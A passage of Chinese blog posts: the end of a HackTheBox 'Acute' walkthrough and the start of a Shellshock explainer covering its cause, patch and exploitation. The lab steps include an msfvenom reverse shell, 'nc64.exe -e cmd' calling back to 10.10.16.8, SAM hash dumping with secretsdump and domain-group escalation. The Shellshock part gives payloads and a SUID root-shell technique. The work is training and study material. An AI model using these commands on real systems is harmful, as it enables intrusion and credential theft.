class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile&quot;</span> /v EnableFirewall<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820161958.png"></p><blockquote><p>全开了，那么例行惯例先看排除目录：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820162819.png"></p><blockquote><p>显然<code>C:\Windows\System32 </code>没有权限，但是<code>C:\Utils</code>是突破口可以落地</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lport=4444 lhost=10.10.16.8 -f exe -o fy.exe<br></code></pre></td></tr></table></figure><h2 id="0x05-横向移动"><a href="#0x05-横向移动" class="headerlink" title="0x05 横向移动"></a>0x05 横向移动</h2><h3 id="imonks-ATSSERVER"><a href="#imonks-ATSSERVER" class="headerlink" title="imonks@ATSSERVER"></a>imonks@ATSSERVER</h3><blockquote><p>传winpeas执行</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820165546.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820165608.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\edavies\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820180419.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820165943.png"></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\<span class="hljs-number">2.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>\passwords.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820180523.png"></p><blockquote><p>获得了一个很长的密码字典，先保存到本地</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820173133.png"></p><blockquote><p>看着像在AD里面</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820180242.png"></p><blockquote><p>令人意外的是有一个正在进行中的rdp会话，这显然不是我们，有必要进行rdp监控screenshare</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821165337.png"></p><blockquote><p>得到的信息：edavies正在使用<code>acute\imonks</code>@<code>w3_4R3_th3_f0rce.</code>凭据向<code>ATSSERVER</code>进行身份验证，使用的配置还是<code>dc_manage</code></p></blockquote><blockquote><p>按照他的语句尝试连接：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;W3_4R3_th3_f0rce.&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\imonks&quot;</span>, <span class="hljs-variable">$pass</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820182153.png"></p><blockquote><p>看起来好像是<code>Measure-Object</code>的cmdlet没被加载</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820182315.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820182500.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820183038.png"></p><blockquote><p>如gpt所言，用<code>Invoke-Command</code> 远程加载运行代码时，它会在一个新的上下文中执行，从而绕过<code>dc_manage</code>的限制</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820183324.png"></p><blockquote><p>现在我们获得了一个<code>ATSSERVER</code>机器的初始权限，以imonks的身份</p></blockquote><h3 id="jmorgan-Acute-PC01"><a href="#jmorgan-Acute-PC01" class="headerlink" title="jmorgan@Acute-PC01"></a>jmorgan@Acute-PC01</h3><p>在这种受限的条件下枚举可用命令是十分有必要的（包括alias）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">Get-Command</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820193345.png"></p><blockquote><p>在检索该用户桌面时还发现了一个脚本文件：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820195913.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$securepasswd</span> = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span><br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$securepasswd</span> | <span class="hljs-built_in">ConvertTo-SecureString</span><br><span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, <span class="hljs-variable">$passwd</span>)<br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<span class="hljs-built_in">Get-Volume</span>&#125; <span class="hljs-literal">-ComputerName</span> Acute<span class="hljs-literal">-PC01</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span><br></code></pre></td></tr></table></figure><blockquote><p>在<code>Acute-PC01</code>上逐行执行，尝试获得凭据</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820205550.png"></p><blockquote><p>很遗憾但是在情理之中的失败，显然是因为安全密码字符串是使用仅在被加密的计算机上可用的信息进行加密的</p></blockquote><blockquote><p>那么我们现在其实只能通过之前的命令去<code>ATSSERVER</code>上执行该脚本</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; C:\users\imonks\desktop\wm.ps1 &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820210222.png"></p><blockquote><p>这里执行的是写好的<code>Get-Volume</code>命令，那么我们很自然的可以想到替换成反射shell语句，来拿到<code>acute\jmorgan</code>在<code>Acute-PC01</code>上的shell</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-variable">$securepasswd</span> = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c 0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span>; <span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$securepasswd</span> | <span class="hljs-built_in">ConvertTo-SecureString</span>; <span class="hljs-variable">$creds</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, <span class="hljs-variable">$passwd</span>); <span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123;<span class="hljs-built_in">Get-Volume</span>&#125; <span class="hljs-literal">-ComputerName</span> Acute<span class="hljs-literal">-PC01</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$creds</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820211948.png"></p><blockquote><p>一如我们在之前查看的，可用的cmdlet并没有ConvertTo-SecureString<br>但很矛盾的是我们上一步中已经成功执行了该脚本</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820212422.png"></p><blockquote><p>根据gpt的说法，可能是该脚本的缓存机制导致了脚本中可用ConvertTo-SecureString<br>而且幸运的是，这个脚本就在我们可控用户的桌面，它是可控的<br>同时由于Set-Content这个cmdlet可用，所以我们可以很轻松的将其修改为反弹shell语句</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; ((<span class="hljs-built_in">cat</span> ..\desktop\wm.ps1 <span class="hljs-literal">-Raw</span>) <span class="hljs-operator">-replace</span> <span class="hljs-string">&#x27;Get-Volume&#x27;</span>, <span class="hljs-string">&#x27;C:\utils\nc64.exe -e cmd 10.10.16.8 9999&#x27;</span>) | <span class="hljs-built_in">sc</span> <span class="hljs-literal">-Path</span> ..\desktop\wm.ps1 &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820213531.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820213736.png"></p><blockquote><p>至此拿到了<code>jmorgan</code>在Acute-PC01的立足点</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820215414.png"></p><h3 id="awallace-ATSSERVER"><a href="#awallace-ATSSERVER" class="headerlink" title="awallace@ATSSERVER"></a>awallace@ATSSERVER</h3><blockquote><p>很遗憾，即使我们已经是<code>BUILTIN\Administrators</code>的成员，但仍然不够，<code>c:\users\administrator\desktop\root.txt</code>并不在这台机子，还需要进一步提权到域管理组去疑似域控的<code>ATSSERVER</code>寻找</p></blockquote><blockquote><p>现在我们手上有一个本地管理员用户，不管怎样我们都应该优先转储哈希</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg save HKLM\system sys.bak<br>reg save HKLM\sam sam.bak<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">secretsdump.py -sam sam.bak -system sys.bak LOCAL<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821105401.png"></p><blockquote><p>获得了Guest是空密码和Administrator是<code>Password@123</code><br>在任何情况下获得新的密码时，尝试密码复用都是很有必要的</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pass</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;Password@123&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span> <br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\awallace&quot;</span>, <span class="hljs-variable">$pass</span>)<br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-ScriptBlock</span> &#123; whoami &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821110102.png"></p><blockquote><p>事实上，该密码被awallace在ATSSERVER上使用</p></blockquote><blockquote><p>我们现在又回到了这台受限制的机子<code>ATSSERVER</code>，以awallace的身份<br>和之前一样，还是做一些必要的探索：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821110407.png"></p><blockquote><p>就cmdlet来说还是一样的苛刻</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">ls</span> <span class="hljs-string">&#x27;\program files\keepmeon&#x27;</span> &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821110726.png"></p><blockquote><p>不同的是，这次可以对神秘的program <code>keepmeon</code>访问了</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-comment">REM This is run every 5 minutes. For Lois use ONLY</span><br>@<span class="hljs-built_in">echo</span> off<br> <span class="hljs-keyword">for</span> /R <span class="hljs-variable">%%x</span> <span class="hljs-keyword">in</span> (*.bat) <span class="hljs-keyword">do</span> ( <br> <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> &quot;<span class="hljs-variable">%%x</span>&quot; == &quot;%~<span class="hljs-number">0</span>&quot; <span class="hljs-keyword">call</span> &quot;<span class="hljs-variable">%%x</span>&quot;<br> )<br></code></pre></td></tr></table></figure><blockquote><p>看起来我们的网站管理员lois会定时执行这个文件，文件本身是用来执行除自己外的bat文件<br>让我们先来查看lois(网站管理员)能做什么：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; net <span class="hljs-built_in">group</span> /domain &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; net <span class="hljs-built_in">group</span> Site_Admin /domain &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821111157.png"></p><blockquote><p>对于<code>Site_Admin</code>组的描述是紧急情况下的可访问域管理员组<br>此时思路已经明了，我选择将我们控制的awallace加入<code>site_admin</code>组</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">Set-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;\program files\keepmeon\fy.bat&#x27;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&#x27;net group site_admin awallace /add /domain&#x27;</span>&#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure><blockquote><p>添加上述bat文件，loris会替我们执行它</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821112612.png"></p><blockquote><p>为了保险起见我还添加了jmorgan测试<br>现在我们应该已经可以读到<code>c\users\administrator\desktop\root.txt</code></p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-ScriptBlock</span> &#123; <span class="hljs-built_in">cat</span> <span class="hljs-string">&#x27;c:\users\administrator\desktop\root.txt&#x27;</span>  &#125; <span class="hljs-literal">-ComputerName</span> ATSSERVER <span class="hljs-literal">-ConfigurationName</span> dc_manage <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellshock</title>
    <link href="/blog/vuln/vuln%20shellshock/"/>
    <url>/blog/vuln/vuln%20shellshock/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><blockquote><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#payload：</span><br><span class="hljs-built_in">env</span> x=<span class="hljs-string">&#x27;() &#123; :; &#125;; echo shellshocked&#x27;</span> bash -c <span class="hljs-string">&quot;echo 1&quot;</span><br><span class="hljs-comment">#存在漏洞时输出有shellshock（注意加必要的空格）</span><br></code></pre></td></tr></table></figure><blockquote><p>漏洞核心原理：类似代码注入，父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后，在子进程中调用该字符串时将其理解为函数执行，本质上是bash代码本身对于处理该类环境变量时的不合理</p></blockquote><h2 id="0x02-前置知识-环境变量-bash"><a href="#0x02-前置知识-环境变量-bash" class="headerlink" title="0x02 (前置知识) 环境变量&amp;bash"></a>0x02 (前置知识) 环境变量&amp;bash</h2><p>1、shell变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331181204.png" alt="image.png"></p><blockquote><p>子进程不继承普通shell变量</p></blockquote><p>2、shell环境变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331181357.png" alt="image.png"></p><blockquote><p>子进程可以继承环境变量</p></blockquote><p>3、shell函数变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331182209.png" alt="image.png"></p><blockquote><p>子进程不继承普通函数变量</p></blockquote><p>4、环境变量版函数变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331183038.png" alt="image.png"></p><blockquote><p>子进程会继承环境变量版函数变量</p></blockquote><p>5、字符串版 函数环境变量（漏洞点1）</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240331185121.png" alt="image.png"></p><blockquote><p>将函数声明当作字符串赋值给环境变量时，子进程会错误的把普通环境变量当作函数变量执行！</p></blockquote><blockquote><p>对比没有漏洞的kali：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404130737.png" alt="image.png"></p></blockquote><p>6、字符串定义一次性版 函数环境变量：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404132634.png" alt="image.png"></p><blockquote><p>env定义一次性环境变量，之后可加被作用的命令语句</p></blockquote><blockquote><p>对比没有漏洞的kali：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404133435.png" alt="image.png"></p></blockquote><p>7、字符串定义版 函数环境变量注入：</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404143137.png" alt="image.png"></p><blockquote><p>启动bash子进程时居然执行了一次在函数定义语句后方的注入代码！<br>具体原因后文探讨</p></blockquote><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><blockquote><p>触发shellshcok：</p><ol><li>存在子进程对字符串环境变量的解析错误（解析为函数变量），得以获得有问题的函数变量</li><li>bash未对函数变量做明确的界定、截取，导致结尾处代码注入（具体原因后文探讨）</li></ol></blockquote><h2 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h2><h3 id="1、bash对于函数变量的解析"><a href="#1、bash对于函数变量的解析" class="headerlink" title="1、bash对于函数变量的解析"></a>1、bash对于函数变量的解析</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404144334.png" alt="image.png"></p><blockquote><p>新的bash进程会重新加载环境变量，此时解析器若发现括号和花括号时就会认定它是函数定义<br>这就是子进程错把字符串形式的变量解析为函数变量的原因</p></blockquote><h3 id="2、尾部代码注入"><a href="#2、尾部代码注入" class="headerlink" title="2、尾部代码注入"></a>2、尾部代码注入</h3><blockquote><p>关于为什么bash把函数体解析完之后会去执行后面的注入语句：</p></blockquote><blockquote><p>有漏洞的bash的源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404161022.png" alt="image.png"></p><blockquote><p>简单分析源码，Bash初始化时调用了<code>builtins/evalstring.c</code>里的<code>parse_and_execute</code>函数。是的，就等于Bash初始化环境时调用了类似其他高级语言中的<code>eval</code>函数，它负责解析字符串输入并执行。但是又未对变量进行截取、过滤，导致读到后括号 } 时没有结束！</p></blockquote><blockquote><p>其实Bash本身其实是想在启动时初始环境变量以及定义一些函数，而初始的方式就是去把 <code>变量名=值</code> 这样的赋值语句用eval去执行一次，如果出现了函数定义，就把它转变成函数，除此之外就不想让它干其他的了，可偏偏它在扫描到函数定义时，把它转变成函数的过程中不小心执行了后面的命令，这其实不是eval的错，这是做语法解析时没考虑严格，所以补丁加了这么一句话来判断函数体合法性：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> ((flags &amp;amp; SEVAL_FUNCDEF) &amp;amp;&amp;amp; command-&amp;gt;type != cm_function_def)<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404163420.png" alt="image.png"></p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote><p>经典payload：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> c=<span class="hljs-string">&#x27;() &#123; :;&#125;; echo 1&#x27;</span> bash -c <span class="hljs-string">&#x27;echo 2&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404182814.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240404182822.png" alt="image.png"></p><blockquote><p>定义一个字符串型函数环境变量，尾部注入检测点echo 1，最后启动一个新bash触发被注入代码<br>注意空格之类的细节</p></blockquote><h3 id="攻击suid程序本地提权"><a href="#攻击suid程序本地提权" class="headerlink" title="攻击suid程序本地提权"></a>攻击suid程序本地提权</h3><blockquote><p>将system中写死命令的执行点利用shellshock进行转移外带</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405212529.png" alt="image.png"></p><blockquote><p>假设现在有这样一个有s位的可执行文件，由root编译且setuid，system中的命令写死&#x2F;bin&#x2F;ls，即不能执行其他命令，且因为写死了&#x2F;bin也不能劫持ls，此时便可用shellshock转移外带出执行点！</p></blockquote><p>1、将&#x2F;bin&#x2F;sh软链接到存在漏洞的bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /bin/bash /bin/sh<br></code></pre></td></tr></table></figure><blockquote><p>因为system底层使用的是&#x2F;bin&#x2F;sh，并非bash<br>此时执行文件已可以启动有漏洞的bash</p></blockquote><p>2、导入永久型函数环境变量、执行s位文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> <span class="hljs-built_in">test</span>=<span class="hljs-string">&#x27;() &#123; :;&#125;;/bin/bash -p&#x27;</span><br>./exp<br></code></pre></td></tr></table></figure><blockquote><p>此时只要启动bash就会加载一次环境变量test、执行一次被注入的语句(可以是反弹shell)，从而转移出命令执行点，由于最初的触发点是root的s位，所以拿到的会是root shell</p></blockquote><p>注意：做题时一定注意反编译出的可执行文件有没有setuid0（设置进程uid为root），若没有就是虚假的s位文件，无法利用！（即需要同时设置文件的suid和进程的suid，才真正有root权限）</p><h3 id="攻击ssh"><a href="#攻击ssh" class="headerlink" title="攻击ssh"></a>攻击ssh</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223202.png" alt="image.png"></p><blockquote><p>先来看openssh的阻止特定用户ssh登录功能：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223605.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i identity_file shocker@140.20.11.30<br>The authenticity of host <span class="hljs-string">&#x27;140.20.11.30 (140.20.11.30)&#x27;</span> can<span class="hljs-string">&#x27;t be established</span><br><span class="hljs-string">...</span><br><span class="hljs-string">Enter passphrase for key &#x27;</span>identity_file<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">Connection to 140.20.11.30 closed.</span><br></code></pre></td></tr></table></figure><blockquote><p>对比两种方式：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240405223816.png" 